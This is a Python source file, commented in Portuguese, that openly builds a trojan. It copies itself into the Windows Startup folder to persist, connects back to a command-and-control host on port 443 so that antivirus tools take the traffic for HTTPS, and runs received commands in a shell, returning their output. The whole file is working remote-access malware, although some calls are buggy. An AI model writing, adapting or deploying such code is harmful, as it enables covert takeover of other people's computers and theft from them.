#Criar um Trjn em Python e obter conexão com a máquina de destino.
#Sumário
# Funct de persistencia
# função de conexao
# função de acesso ao cmd
# funcao cliente para manter ela viva

import threading
import socket
import subprocess
import threading
import time
import os


#toda vez que o target se conectar no servido o antivirus vai pensar que é conexão hhtps e permite
#PC target vai se conectar ao Host

CCIP = ""
CCPORT = 443 # https port


#                                         ## ## FUNCTIONS ## ##

# --------------------------------------- Function para persistencia ao tr0j4n---------------------
    #persistencia = manter o acesso apos a maquina target ser reiniciada
def autorun():
    #filen = o caminho do sistema operacional
    filen = os.path.basename(__file__)
    
    #para copiar o arquivo vamos converter 
                            #do phyton pro -> executavel
    exe_file = filen.replace(".py", ".exe")
                    #substituir     

    #pegar o caminho para onde eu vou jogar o file                                                    #formato do arquivo(nome da variavel)
    #os.system("copy {} C:\Users\rodri\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup " .format(exe))
    os.system("copy {} \"%APPDATA%\\Microsoft\Windows\Start Menu\Programs\Startup " .format(exe_file))
                                                                         #all in startup inicializa quando o pc for ligado

# --------------------------------------- Function Init Conection  --------------------------------------------------------

def conn(CCIP, CCPORT):
    try:
        #começar conexão com o cliente
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #conectar na porta do meu servidor e o IP do servidor

        client.connect((CCIP, CCPORT))
        return client #retornar a conexão

    except Exception as error: #mostrar o erro caso conexão negada 
        print(error)

                                                                    
#2 ---------------------------------------- Function cmd Acess -----------------------------------------------------
        #receber data do cliente
def cmd(client, data):
    try:                                            #======================================#
    #vamos pegar tudo oq é de conexao               #|tratar os erros de digitação no cmd |#
    #proc nos da acesso aos Sub-Process Win         #|ex: não existe esse comando         |#
        proc = subprocess.Popen(data, shell = True, stdin= subprocess.PIPE, stdout=subprocess.PIPE)
                                                    #=====================================|#
    #criar mensagem que vai ser mostrada
                            #read vai fazer a leitura e tratar o erro com PROC
        output = proc.stdout.read() + proc.stderr.read() 
    
        #criar uma conexão com o client 
        # e mandar o output(comando) pro servidor                 
        client.send(output + b"\n")
        
        
    #execao para caso nao der certo ,ele mande um sinal de um erro
    except Exception as error:
        print(error)

# ---------------------------------------------- Fuction Check Connection -------------------------------------------------

#checar se a conexao ainda esta ativa, recebendo informações
def checkClientConnect(client, data):
    try:
        while True:     #pacote 1024
            data = client.recv(1024).decode().strip()            #receber pacote e fragmentar                                 
             
            if data == "/:kill":             #comando ao digitar para sair da conexao -->kill
                return                             #mas sem perder a conexão outras vezes       #======================================================================#
                                                                                                #|Ex: queremos usar o notepad no pc cliente                           |#
                                                                                                #|     mas enquanto o notepad estiver aberto                           |#
            else: #jogar uma thread dentro                                                      #|    nao conseguimos dar outro comando sem a threading               |#
                #Target é o cmd client                                                          #|     a trheading trata varias threadings ---> execucao de programas |#
                threading.Thread( target=cmd, args = (client, data) ).start()                   #======================================================================#
                #precisamos iniciar a threading                                                                                  /\
                #com o threading podemos tratar mais de uma threadings --------------------------------------------------------> ||

    except Exception as error:
        client.close() #fechar a conexao se naO ESTIVERMOS RECEBENDO PACOTES
        
#Criar funcao main

if __name__ == "__main__":
    autorun() 
    while True:                         #lidar com a conexao
        client = conn(CCIP, CCPORT)
        if client:    
            checkClientConnect(client) 
        else:               
            time.sleep(3)  
